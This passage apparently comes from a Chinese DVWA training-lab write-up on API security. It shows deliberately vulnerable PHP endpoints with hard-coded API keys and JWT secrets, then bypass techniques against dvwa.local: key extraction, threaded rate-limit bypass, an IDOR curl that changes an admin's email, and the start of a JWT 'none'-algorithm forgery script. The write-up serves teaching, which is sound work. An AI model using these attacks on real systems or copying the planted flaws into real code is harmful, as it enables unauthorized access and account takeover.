class="string">&#x27;No valid fields to update&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;UPDATE users SET &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$updates</span>) . <span class="string">&quot; WHERE user_id = :id&quot;</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;User updated&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Failed to update user&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">404</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Endpoint not found&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>API密钥认证</strong> - 需要密钥才能访问</li>
+<li><strong>限流机制</strong> - 防止DoS攻击</li>
+<li><strong>PDO预编译</strong> - 防止SQL注入</li>
+<li><strong>字段白名单</strong> - 限制可修改字段</li>
+<li><strong>不返回密码</strong> - 敏感信息保护</li>
+</ol>
+<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
+<ol>
+<li><strong>硬编码API密钥</strong> - 所有用户共享</li>
+<li><strong>无授权检查</strong> - 有密钥就能操作所有数据</li>
+<li><strong>限流实现弱</strong> - 文件锁不安全</li>
+<li><strong>无用户上下文</strong> - 不知道谁在操作</li>
+</ol>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：获取API密钥"><a href="#方法1：获取API密钥" class="headerlink" title="方法1：获取API密钥"></a>方法1：获取API密钥</h4><p><strong>从客户端代码获取：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果前端代码中硬编码了API密钥</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">API_KEY</span> = <span class="string">&#x27;dvwa_api_key_12345&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/users/1&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;X-API-Key&#x27;</span>: <span class="variable constant_">API_KEY</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看浏览器开发者工具 → Network → Headers</span></span><br><span class="line"><span class="comment">// 可以看到X-API-Key</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>从文档获取：</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果API文档公开</span></span><br><span class="line">curl -X GET http:<span class="regexp">//</span>dvwa.local<span class="regexp">/api/u</span>sers/<span class="number">1</span> \</span><br><span class="line">     -H <span class="string">&quot;X-API-Key: dvwa_api_key_12345&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：绕过限流"><a href="#方法2：绕过限流" class="headerlink" title="方法2：绕过限流"></a>方法2：绕过限流</h4><p><strong>使用多个API密钥（如果有）：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">api_keys = [<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>, <span class="string">&#x27;key3&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    key = api_keys[i % <span class="built_in">len</span>(api_keys)]</span><br><span class="line">    requests.get(url, headers=&#123;<span class="string">&#x27;X-API-Key&#x27;</span>: key&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>竞态条件：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 同时发送多个请求</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_request</span>():</span><br><span class="line">    requests.get(url, headers=&#123;<span class="string">&#x27;X-API-Key&#x27;</span>: api_key&#125;)</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    t = threading.Thread(target=make_request)</span><br><span class="line">    t.start()</span><br><span class="line">    threads.append(t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：越权访问"><a href="#方法3：越权访问" class="headerlink" title="方法3：越权访问"></a>方法3：越权访问</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改其他用户数据（有密钥即可）</span></span><br><span class="line">curl -X PUT http://dvwa.local/api/users/1 \</span><br><span class="line">     -H <span class="string">&quot;X-API-Key: dvwa_api_key_12345&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;&quot;email&quot;: &quot;hacked@evil.com&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果：成功修改admin的邮箱</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用JWT Token和更严格的权限检查，但仍有绕过可能。</p>
+<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：JWT Token认证 ★★★</span></span><br><span class="line"><span class="comment">// 从Authorization头获取Token</span></span><br><span class="line"><span class="comment">// Bearer token格式</span></span><br><span class="line"><span class="variable">$authHeader</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AUTHORIZATION&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/Bearer\s+(.*)$/i&#x27;</span>, <span class="variable">$authHeader</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Missing or invalid authorization header&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ JWT验证 ★★★</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_jwt</span>(<span class="params"><span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// JWT格式：header.payload.signature</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$parts</span>) !== <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$header_b64</span>, <span class="variable">$payload_b64</span>, <span class="variable">$signature_b64</span>) = <span class="variable">$parts</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：密钥硬编码 ★★★</span></span><br><span class="line">    <span class="variable">$secret</span> = <span class="string">&#x27;my_jwt_secret_key&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证签名</span></span><br><span class="line">    <span class="variable">$signature_check</span> = <span class="title function_ invoke__">hash_hmac</span>(</span><br><span class="line">        <span class="string">&#x27;sha256&#x27;</span>,</span><br><span class="line">        <span class="variable">$header_b64</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$payload_b64</span>,</span><br><span class="line">        <span class="variable">$secret</span>,</span><br><span class="line">        <span class="literal">true</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$signature_check_b64</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">strtr</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$signature_check</span>), <span class="string">&#x27;+/&#x27;</span>, <span class="string">&#x27;-_&#x27;</span>), <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$signature_check_b64</span> !== <span class="variable">$signature_b64</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解码payload</span></span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strtr</span>(<span class="variable">$payload_b64</span>, <span class="string">&#x27;-_&#x27;</span>, <span class="string">&#x27;+/&#x27;</span>)), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进：检查过期时间 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>[<span class="string">&#x27;exp&#x27;</span>]) &amp;&amp; <span class="variable">$payload</span>[<span class="string">&#x27;exp&#x27;</span>] &lt; <span class="title function_ invoke__">time</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// Token已过期</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$payload</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">verify_jwt</span>(<span class="variable">$token</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$payload</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Invalid or expired token&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从payload获取用户信息</span></span><br><span class="line"><span class="variable">$currentUserId</span> = <span class="variable">$payload</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"><span class="variable">$currentUserRole</span> = <span class="variable">$payload</span>[<span class="string">&#x27;role&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GET /api/users/&#123;id&#125;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$method</span> == <span class="string">&#x27;GET&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进：权限检查 ★★★</span></span><br><span class="line">    <span class="comment">// 普通用户只能查看自己</span></span><br><span class="line">    <span class="comment">// 管理员可以查看所有用户</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$currentUserRole</span> !== <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$currentUserId</span> != <span class="variable">$userId</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Forbidden: You can only view your own data&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询用户</span></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT user_id, user, first_name, last_name, email, role FROM users WHERE user_id = :id&#x27;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$userId</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$user</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;User not found&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PUT /api/users/&#123;id&#125;</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$method</span> == <span class="string">&#x27;PUT&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$input</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 权限检查 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$currentUserRole</span> !== <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$currentUserId</span> != <span class="variable">$userId</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Forbidden: You can only update your own data&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 字段白名单（根据角色） ★★★</span></span><br><span class="line">    <span class="variable">$allowedFields</span> = [<span class="string">&#x27;first_name&#x27;</span>, <span class="string">&#x27;last_name&#x27;</span>, <span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：管理员可以修改role ★★★</span></span><br><span class="line">    <span class="comment">// 但没有检查是否在修改自己的role</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$currentUserRole</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$allowedFields</span>[] = <span class="string">&#x27;role&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$updates</span> = [];</span><br><span class="line">    <span class="variable">$params</span> = [<span class="string">&#x27;:id&#x27;</span> =&gt; <span class="variable">$userId</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>, <span class="variable">$allowedFields</span>)) &#123;</span><br><span class="line">            <span class="variable">$updates</span>[] = <span class="string">&quot;<span class="subst">$key</span> = :<span class="subst">$key</span>&quot;</span>;</span><br><span class="line">            <span class="variable">$params</span>[<span class="string">&quot;:<span class="subst">$key</span>&quot;</span>] = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$updates</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;No valid fields to update&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;UPDATE users SET &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$updates</span>) . <span class="string">&quot; WHERE user_id = :id&quot;</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;User updated&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Failed to update user&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">404</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Endpoint not found&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>JWT Token认证</strong> - 基于Token的认证</li>
+<li><strong>Token过期</strong> - 限制Token有效期</li>
+<li><strong>角色授权</strong> - 根据角色限制访问</li>
+<li><strong>资源所有权</strong> - 只能访问自己的数据</li>
+</ol>
+<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
+<ol>
+<li><strong>JWT密钥硬编码</strong> - 可能被获取</li>
+<li><strong>算法混淆攻击</strong> - none算法绕过</li>
+<li><strong>权限检查逻辑漏洞</strong> - 管理员可以修改自己为超级管理员</li>
+</ol>
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：JWT算法混淆攻击"><a href="#方法1：JWT算法混淆攻击" class="headerlink" title="方法1：JWT算法混淆攻击"></a>方法1：JWT算法混淆攻击</h4><p><strong>None算法攻击：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建header（指定算法为none）</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建payload</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;user_id&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span 